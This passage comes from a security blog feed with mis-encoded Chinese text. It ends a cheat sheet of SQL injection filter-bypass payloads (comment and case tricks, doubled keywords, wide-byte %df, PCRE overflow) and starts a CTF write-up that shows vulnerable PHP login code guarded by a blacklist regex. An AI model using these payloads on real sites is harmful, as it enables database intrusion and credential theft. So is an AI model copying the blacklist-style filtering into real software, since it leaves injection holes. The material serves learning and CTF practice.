ç­‰ä»·äºä¸‹é¢è¿™æ¡<span class="keyword">SQL</span>è¯­å¥</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="5-æ¯”è¾ƒç¬¦å·ï¼ˆï¼‰ç»•è¿‡ï¼ˆè¿‡æ»¤äº†ï¼šsqlmapç›²æ³¨ç»å¸¸ä½¿ç”¨ï¼Œä½¿ç”¨betweençš„è„šæœ¬ï¼‰ï¼š"><a href="#5-æ¯”è¾ƒç¬¦å·ï¼ˆï¼‰ç»•è¿‡ï¼ˆè¿‡æ»¤äº†ï¼šsqlmapç›²æ³¨ç»å¸¸ä½¿ç”¨ï¼Œä½¿ç”¨betweençš„è„šæœ¬ï¼‰ï¼š" class="headerlink" title="5.æ¯”è¾ƒç¬¦å·ï¼ˆ&lt;&gt;ï¼‰ç»•è¿‡ï¼ˆè¿‡æ»¤äº†&lt;&gt;ï¼šsqlmapç›²æ³¨ç»å¸¸ä½¿ç”¨&lt;&gt;ï¼Œä½¿ç”¨betweençš„è„šæœ¬ï¼‰ï¼š"></a>5.æ¯”è¾ƒç¬¦å·ï¼ˆ&lt;&gt;ï¼‰ç»•è¿‡ï¼ˆè¿‡æ»¤äº†&lt;&gt;ï¼šsqlmapç›²æ³¨ç»å¸¸ä½¿ç”¨&lt;&gt;ï¼Œä½¿ç”¨betweençš„è„šæœ¬ï¼‰ï¼š</h2><h3 id="ä½¿ç”¨greatest-ã€leastï¼ˆï¼‰ï¼šï¼ˆå‰è€…è¿”å›æœ€å¤§å€¼ï¼Œåè€…è¿”å›æœ€å°å€¼ï¼‰"><a href="#ä½¿ç”¨greatest-ã€leastï¼ˆï¼‰ï¼šï¼ˆå‰è€…è¿”å›æœ€å¤§å€¼ï¼Œåè€…è¿”å›æœ€å°å€¼ï¼‰" class="headerlink" title="ä½¿ç”¨greatest()ã€leastï¼ˆï¼‰ï¼šï¼ˆå‰è€…è¿”å›æœ€å¤§å€¼ï¼Œåè€…è¿”å›æœ€å°å€¼ï¼‰"></a>ä½¿ç”¨greatest()ã€leastï¼ˆï¼‰ï¼šï¼ˆå‰è€…è¿”å›æœ€å¤§å€¼ï¼Œåè€…è¿”å›æœ€å°å€¼ï¼‰</h3><p>ã€€åŒæ ·æ˜¯åœ¨ä½¿ç”¨ç›²æ³¨çš„æ—¶å€™ï¼Œåœ¨ä½¿ç”¨äºŒåˆ†æŸ¥æ‰¾çš„æ—¶å€™éœ€è¦ä½¿ç”¨åˆ°æ¯”è¾ƒæ“ä½œç¬¦æ¥è¿›è¡ŒæŸ¥æ‰¾ã€‚å¦‚æœæ— æ³•ä½¿ç”¨æ¯”è¾ƒæ“ä½œç¬¦ï¼Œé‚£ä¹ˆå°±éœ€è¦ä½¿ç”¨åˆ°<code>greatest</code>æ¥è¿›è¡Œç»•è¿‡äº†ã€‚<br>ã€€ã€€æœ€å¸¸è§çš„ä¸€ä¸ªç›²æ³¨çš„sqlè¯­å¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">64</span></span><br></pre></td></tr></table></figure><p>ã€€ã€€æ­¤æ—¶å¦‚æœæ¯”è¾ƒæ“ä½œç¬¦è¢«è¿‡æ»¤ï¼Œä¸Šé¢çš„ç›²æ³¨è¯­å¥åˆ™æ— æ³•ä½¿ç”¨,é‚£ä¹ˆå°±å¯ä»¥ä½¿ç”¨<code>greatest</code>æ¥ä»£æ›¿æ¯”è¾ƒæ“ä½œç¬¦äº†ã€‚greatest(n1,n2,n3,â€¦)å‡½æ•°è¿”å›è¾“å…¥å‚æ•°(n1,n2,n3,â€¦)çš„æœ€å¤§å€¼ã€‚<br>ã€€ã€€é‚£ä¹ˆä¸Šé¢çš„è¿™æ¡sqlè¯­å¥å¯ä»¥ä½¿ç”¨<code>greatest</code>å˜ä¸ºå¦‚ä¸‹çš„å­å¥:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> greatest(ascii(substr(database(),<span class="number">0</span>,<span class="number">1</span>)),<span class="number">64</span>)<span class="operator">=</span><span class="number">64</span></span><br></pre></td></tr></table></figure><h3 id="ä½¿ç”¨between-andï¼š"><a href="#ä½¿ç”¨between-andï¼š" class="headerlink" title="ä½¿ç”¨between andï¼š"></a>ä½¿ç”¨between andï¼š</h3><p>  between a and bï¼š</p><p>between 1 and 1; ç­‰ä»·äº &#x3D;1</p><h2 id="6-or-and-xor-notç»•è¿‡ï¼š"><a href="#6-or-and-xor-notç»•è¿‡ï¼š" class="headerlink" title="6.or and xor notç»•è¿‡ï¼š"></a>6.or and xor notç»•è¿‡ï¼š</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span><span class="operator">=</span><span class="operator">&amp;&amp;</span>  <span class="keyword">or</span><span class="operator">=</span><span class="operator">||</span>   xor<span class="operator">=</span><span class="operator">|</span>   <span class="keyword">not</span><span class="operator">=</span><span class="operator">!</span></span><br></pre></td></tr></table></figure><h2 id="7-ç»•è¿‡æ³¨é‡Šç¬¦å·ï¼ˆ-ï¼Œâ€“-åé¢è·Ÿä¸€ä¸ªç©ºæ ¼ï¼‰ï¼‰è¿‡æ»¤ï¼š"><a href="#7-ç»•è¿‡æ³¨é‡Šç¬¦å·ï¼ˆ-ï¼Œâ€“-åé¢è·Ÿä¸€ä¸ªç©ºæ ¼ï¼‰ï¼‰è¿‡æ»¤ï¼š" class="headerlink" title="7.ç»•è¿‡æ³¨é‡Šç¬¦å·ï¼ˆ#ï¼Œâ€“(åé¢è·Ÿä¸€ä¸ªç©ºæ ¼ï¼‰ï¼‰è¿‡æ»¤ï¼š"></a>7.ç»•è¿‡æ³¨é‡Šç¬¦å·ï¼ˆ#ï¼Œâ€“(åé¢è·Ÿä¸€ä¸ªç©ºæ ¼ï¼‰ï¼‰è¿‡æ»¤ï¼š</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,3||&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>ã€€ã€€æœ€åçš„or â€˜1é—­åˆæŸ¥è¯¢è¯­å¥çš„æœ€åçš„å•å¼•å·ï¼Œæˆ–è€…ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,&#x27;</span><span class="number">3</span></span><br></pre></td></tr></table></figure><h2 id="8-ç»•è¿‡ï¼š"><a href="#8-ç»•è¿‡ï¼š" class="headerlink" title="8.&#x3D;ç»•è¿‡ï¼š"></a>8.&#x3D;ç»•è¿‡ï¼š</h2><p>ã€€ã€€ä½¿ç”¨like ã€rlike ã€regexp æˆ–è€… ä½¿ç”¨&lt; æˆ–è€… &gt;</p><h2 id="9-ç»•è¿‡unionï¼Œselectï¼Œwhereç­‰ï¼š"><a href="#9-ç»•è¿‡unionï¼Œselectï¼Œwhereç­‰ï¼š" class="headerlink" title="9.ç»•è¿‡unionï¼Œselectï¼Œwhereç­‰ï¼š"></a>9.ç»•è¿‡unionï¼Œselectï¼Œwhereç­‰ï¼š</h2><h3 id="ï¼ˆ1ï¼‰ä½¿ç”¨æ³¨é‡Šç¬¦ç»•è¿‡ï¼š"><a href="#ï¼ˆ1ï¼‰ä½¿ç”¨æ³¨é‡Šç¬¦ç»•è¿‡ï¼š" class="headerlink" title="ï¼ˆ1ï¼‰ä½¿ç”¨æ³¨é‡Šç¬¦ç»•è¿‡ï¼š"></a>ï¼ˆ1ï¼‰ä½¿ç”¨æ³¨é‡Šç¬¦ç»•è¿‡ï¼š</h3><p>ã€€ã€€å¸¸ç”¨æ³¨é‡Šç¬¦ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>ï¼Œ<span class="comment">-- , /**/, #, --+, -- -, ;,%00,--a</span></span><br></pre></td></tr></table></figure><p>ã€€ã€€ç”¨æ³•ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U<span class="comment">/**/</span> NION <span class="comment">/**/</span> SE<span class="comment">/**/</span> LECT <span class="comment">/**/</span><span class="keyword">user</span>ï¼Œpwd <span class="keyword">from</span> <span class="keyword">user</span></span><br></pre></td></tr></table></figure><h3 id="ï¼ˆ2ï¼‰ä½¿ç”¨å¤§å°å†™ç»•è¿‡ï¼š"><a href="#ï¼ˆ2ï¼‰ä½¿ç”¨å¤§å°å†™ç»•è¿‡ï¼š" class="headerlink" title="ï¼ˆ2ï¼‰ä½¿ç”¨å¤§å°å†™ç»•è¿‡ï¼š"></a>ï¼ˆ2ï¼‰ä½¿ç”¨å¤§å°å†™ç»•è¿‡ï¼š</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;UnIoN/**/SeLeCT</span></span><br></pre></td></tr></table></figure><h3 id="ï¼ˆ3ï¼‰å†…è”æ³¨é‡Šç»•è¿‡ï¼š"><a href="#ï¼ˆ3ï¼‰å†…è”æ³¨é‡Šç»•è¿‡ï¼š" class="headerlink" title="ï¼ˆ3ï¼‰å†…è”æ³¨é‡Šç»•è¿‡ï¼š"></a>ï¼ˆ3ï¼‰å†…è”æ³¨é‡Šç»•è¿‡ï¼š</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span></span><br></pre></td></tr></table></figure><h3 id="ï¼ˆ4ï¼‰-åŒå…³é”®å­—ç»•è¿‡ï¼ˆè‹¥åˆ é™¤æ‰ç¬¬ä¸€ä¸ªåŒ¹é…çš„unionå°±èƒ½ç»•è¿‡ï¼‰ï¼š"><a href="#ï¼ˆ4ï¼‰-åŒå…³é”®å­—ç»•è¿‡ï¼ˆè‹¥åˆ é™¤æ‰ç¬¬ä¸€ä¸ªåŒ¹é…çš„unionå°±èƒ½ç»•è¿‡ï¼‰ï¼š" class="headerlink" title="ï¼ˆ4ï¼‰ åŒå…³é”®å­—ç»•è¿‡ï¼ˆè‹¥åˆ é™¤æ‰ç¬¬ä¸€ä¸ªåŒ¹é…çš„unionå°±èƒ½ç»•è¿‡ï¼‰ï¼š"></a>ï¼ˆ4ï¼‰ åŒå…³é”®å­—ç»•è¿‡ï¼ˆè‹¥åˆ é™¤æ‰ç¬¬ä¸€ä¸ªåŒ¹é…çš„unionå°±èƒ½ç»•è¿‡ï¼‰ï¼š</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;UNIunionONSeLselectECT1,2,3â€“-</span></span><br></pre></td></tr></table></figure><h2 id="10-é€šç”¨ç»•è¿‡ï¼ˆç¼–ç ï¼‰ï¼š"><a href="#10-é€šç”¨ç»•è¿‡ï¼ˆç¼–ç ï¼‰ï¼š" class="headerlink" title="10.é€šç”¨ç»•è¿‡ï¼ˆç¼–ç ï¼‰ï¼š"></a>10.é€šç”¨ç»•è¿‡ï¼ˆç¼–ç ï¼‰ï¼š</h2><p>ã€€ã€€å¦‚URLEncodeç¼–ç ï¼ŒASCII,HEX,unicodeç¼–ç ç»•è¿‡ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>å³<span class="operator">%</span><span class="number">6</span>f<span class="operator">%</span><span class="number">72</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">31</span><span class="operator">%</span><span class="number">3</span>d<span class="operator">%</span><span class="number">31</span>ï¼Œè€ŒTestä¹Ÿå¯ä»¥ä¸º<span class="type">CHAR</span>(<span class="number">101</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">97</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">115</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">116</span>)ã€‚</span><br></pre></td></tr></table></figure><h2 id="11-ç­‰ä»·å‡½æ•°ç»•è¿‡ï¼š"><a href="#11-ç­‰ä»·å‡½æ•°ç»•è¿‡ï¼š" class="headerlink" title="11.ç­‰ä»·å‡½æ•°ç»•è¿‡ï¼š"></a>11.ç­‰ä»·å‡½æ•°ç»•è¿‡ï¼š</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">hex()ã€bin() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> ascii()</span><br><span class="line"></span><br><span class="line">sleep() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>benchmark()</span><br><span class="line"></span><br><span class="line">concat_ws()<span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>group_concat()</span><br><span class="line"></span><br><span class="line">mid()ã€substr() <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="built_in">substring</span>()</span><br><span class="line"></span><br><span class="line">@<span class="variable">@user</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">user</span>()</span><br><span class="line"></span><br><span class="line">@<span class="variable">@datadir</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> datadir()</span><br><span class="line"></span><br><span class="line">ä¸¾ä¾‹ï¼š<span class="built_in">substring</span>()å’Œsubstr()æ— æ³•ä½¿ç”¨æ—¶ï¼š?id<span class="operator">=</span><span class="number">1</span><span class="operator">+</span><span class="keyword">and</span><span class="operator">+</span>ascii(<span class="built_in">lower</span>(mid((<span class="keyword">select</span><span class="operator">+</span>pwd<span class="operator">+</span><span class="keyword">from</span><span class="operator">+</span>users<span class="operator">+</span>limit<span class="operator">+</span><span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">=</span><span class="number">74</span>ã€€</span><br><span class="line"></span><br><span class="line">æˆ–è€…ï¼š</span><br><span class="line">substr((<span class="keyword">select</span> <span class="string">&#x27;password&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>) <span class="operator">=</span> <span class="number">0x70</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x69</span>) <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x70</span>) <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">strcmp(<span class="keyword">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x71</span>) <span class="operator">=</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure><h2 id="12-å®½å­—èŠ‚æ³¨å…¥ï¼š"><a href="#12-å®½å­—èŠ‚æ³¨å…¥ï¼š" class="headerlink" title="12.å®½å­—èŠ‚æ³¨å…¥ï¼š"></a>12.å®½å­—èŠ‚æ³¨å…¥ï¼š</h2><p>ã€€ã€€è¿‡æ»¤ â€˜ çš„æ—¶å€™å¾€å¾€åˆ©ç”¨çš„æ€è·¯æ˜¯å°† â€˜ è½¬æ¢ä¸º &#39; ã€‚</p><p>ã€€ã€€åœ¨ mysql ä¸­ä½¿ç”¨ GBK ç¼–ç çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦ä¸ºä¸€ä¸ªæ±‰å­—ï¼Œä¸€èˆ¬æœ‰ä¸¤ç§æ€è·¯ï¼š</p><p>ã€€ã€€ï¼ˆ1ï¼‰%df åƒæ‰ \ å…·ä½“çš„æ–¹æ³•æ˜¯ urlencode(â€˜) &#x3D; %5c%27ï¼Œæˆ‘ä»¬åœ¨ %5c%27 å‰é¢æ·»åŠ  %df ï¼Œå½¢æˆ %df%5c%27 ï¼Œè€Œ mysql åœ¨ GBK ç¼–ç æ–¹å¼çš„æ—¶å€™ä¼šå°†ä¸¤ä¸ªå­—èŠ‚å½“åšä¸€ä¸ªæ±‰å­—ï¼Œ%df%5c å°±æ˜¯ä¸€ä¸ªæ±‰å­—ï¼Œ%27 ä½œä¸ºä¸€ä¸ªå•ç‹¬çš„ï¼ˆâ€™ï¼‰ç¬¦å·åœ¨å¤–é¢ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="operator">%</span>df<span class="operator">%</span><span class="number">27</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">user</span>(),<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>ã€€ã€€ï¼ˆ2ï¼‰å°† &#39; ä¸­çš„ \ è¿‡æ»¤æ‰ï¼Œä¾‹å¦‚å¯ä»¥æ„é€  %**%5c%5c%27 ï¼Œåé¢çš„ %5c ä¼šè¢«å‰é¢çš„ %5c æ³¨é‡Šæ‰ã€‚</p><h3 id="ä¸€èˆ¬äº§ç”Ÿå®½å­—èŠ‚æ³¨å…¥çš„PHPå‡½æ•°ï¼š"><a href="#ä¸€èˆ¬äº§ç”Ÿå®½å­—èŠ‚æ³¨å…¥çš„PHPå‡½æ•°ï¼š" class="headerlink" title="ä¸€èˆ¬äº§ç”Ÿå®½å­—èŠ‚æ³¨å…¥çš„PHPå‡½æ•°ï¼š"></a>ä¸€èˆ¬äº§ç”Ÿå®½å­—èŠ‚æ³¨å…¥çš„PHPå‡½æ•°ï¼š</h3><p>  1.replaceï¼ˆï¼‰ï¼šè¿‡æ»¤ â€˜ \ ï¼Œå°† â€˜ è½¬åŒ–ä¸º &#39; ï¼Œå°† \  è½¬ä¸º \ï¼Œå°† â€œ è½¬ä¸º &quot; ã€‚ç”¨æ€è·¯ä¸€ã€‚</p><p>  2.addslaches()ï¼šè¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ ï¼ˆ\ï¼‰çš„å­—ç¬¦ä¸²ã€‚é¢„å®šä¹‰å­—ç¬¦ï¼šâ€™ , â€œ , \ ã€‚ç”¨æ€è·¯ä¸€</p><p>ï¼ˆé˜²å¾¡æ­¤æ¼æ´ï¼Œè¦å°† mysql_query è®¾ç½®ä¸º binary çš„æ–¹å¼ï¼‰</p><p>ã€€ ã€€3.mysql_real_escape_string()ï¼šè½¬ä¹‰ä¸‹åˆ—å­—ç¬¦ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x00     \n     \r     \     <span class="string">&#x27;     &quot;     \x1a</span></span><br></pre></td></tr></table></figure><p>ï¼ˆé˜²å¾¡ï¼Œå°†mysqlè®¾ç½®ä¸ºgbkå³å¯ï¼‰</p><h2 id="PCREç»•è¿‡ï¼š"><a href="#PCREç»•è¿‡ï¼š" class="headerlink" title="PCREç»•è¿‡ï¼š"></a>PCREç»•è¿‡ï¼š</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span><span class="comment">/*&#x27;+&#x27;a&#x27;*1000001+&#x27;*/</span><span class="keyword">select</span></span><br></pre></td></tr></table></figure><h1 id=""><a href="#" class="headerlink" title=""></a></h1>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;sqlæ³¨å…¥ç»•è¿‡æŠ€å·§&quot;&gt;&lt;a href=&quot;#sqlæ³¨å…¥ç»•è¿‡æŠ€å·§&quot; class=&quot;headerlink&quot; title=&quot;sqlæ³¨å…¥ç»•è¿‡æŠ€å·§&quot;&gt;&lt;/a&gt;sqlæ³¨å…¥ç»•è¿‡æŠ€å·§&lt;/h1&gt;&lt;h2 id=&quot;1-ç»•è¿‡ç©ºæ ¼ï¼ˆæ³¨é‡Šç¬¦-ï¼Œ-a0ï¼‰ï¼š&quot;&gt;&lt;a href=&quot;#1-ç»•è¿‡ç©ºæ ¼ï¼ˆæ³¨</summary>
      
    
    
    
    <category term="Web" scheme="https://iahzl.github.io/categories/Web/"/>
    
    
    <category term="sqlæ³¨å…¥" scheme="https://iahzl.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="ç»•è¿‡" scheme="https://iahzl.github.io/tags/%E7%BB%95%E8%BF%87/"/>
    
  </entry>
  
  <entry>
    <title>yet_another_mysql_injection</title>
    <link href="https://iahzl.github.io/yet-another-mysql-injection/"/>
    <id>https://iahzl.github.io/yet-another-mysql-injection/</id>
    <published>2023-08-06T02:24:43.000Z</published>
    <updated>2023-08-06T02:36:47.485Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2021-ç¬¬äº”ç©ºé—´æ™ºèƒ½å®‰å…¨å¤§èµ›-Web-yet-another-mysql-injection"><a href="#2021-ç¬¬äº”ç©ºé—´æ™ºèƒ½å®‰å…¨å¤§èµ›-Web-yet-another-mysql-injection" class="headerlink" title="2021-ç¬¬äº”ç©ºé—´æ™ºèƒ½å®‰å…¨å¤§èµ›-Web-yet_another_mysql_injection"></a>2021-ç¬¬äº”ç©ºé—´æ™ºèƒ½å®‰å…¨å¤§èµ›-Web-yet_another_mysql_injection</h1><ol><li>åˆå§‹ç•Œé¢</li></ol><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230801194529159.png" alt="image-20230801194529159"></p><p>æŸ¥çœ‹æºä»£ç å‘ç°æºç æ–‡ä»¶  <strong>&#x2F;?source</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;lib.php&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">alertMes</span>(<span class="params"><span class="variable">$mes</span>,<span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;<span class="subst">&#123;$mes&#125;</span>&#x27;);location.href=&#x27;<span class="subst">&#123;$url&#125;</span>&#x27;;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$username</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;only admin can login&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">checkSql</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$user_result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$user_result</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;something wrong&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="variable">$password</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$FLAG</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">alertMes</span>(<span class="string">&quot;wrong password&quot;</span>,<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;</span><br><span class="line">  <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>æºç åˆ†æ</li></ol><ul><li><code>alertMes($mes, $url)</code>ï¼šè¯¥å‡½æ•°æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œ<code>$mes</code>ï¼ˆè¦æ˜¾ç¤ºçš„æ¶ˆæ¯ï¼‰å’Œ<code>$url</code>ï¼ˆæ˜¾ç¤ºæ¶ˆæ¯åè¦é‡å®šå‘çš„URLï¼‰ã€‚å®ƒä½¿ç”¨JavaScriptè¾“å‡ºä¸€ä¸ªåŒ…å«ç»™å®šæ¶ˆæ¯çš„è­¦å‘Šå¼¹çª—ï¼Œç„¶åå°†ç”¨æˆ·é‡å®šå‘åˆ°æŒ‡å®šçš„URLã€‚</li><li><code>checkSql($s)</code>ï¼šè¯¥å‡½æ•°æ¥å—ä¸€ä¸ªå‚æ•°<code>$s</code>ï¼ˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼‰ï¼Œå¹¶æ£€æŸ¥å…¶ä¸­æ˜¯å¦åŒ…å«ä»»ä½•å¯ç–‘çš„SQLå…³é”®è¯æˆ–å­—ç¬¦ï¼Œè¿™å¯èƒ½è¡¨æ˜è¯•å›¾è¿›è¡ŒSQLæ³¨å…¥æ”»å‡»ã€‚å¦‚æœå‘ç°ä»»ä½•å¯ç–‘å…³é”®è¯æˆ–å­—ç¬¦ï¼Œå®ƒå°†ä½¿ç”¨<code>alertMes</code>å‡½æ•°æ˜¾ç¤ºè­¦å‘Šï¼Œå¹¶å°†ç”¨æˆ·é‡å®šå‘åˆ° â€œindex.phpâ€ã€‚</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span 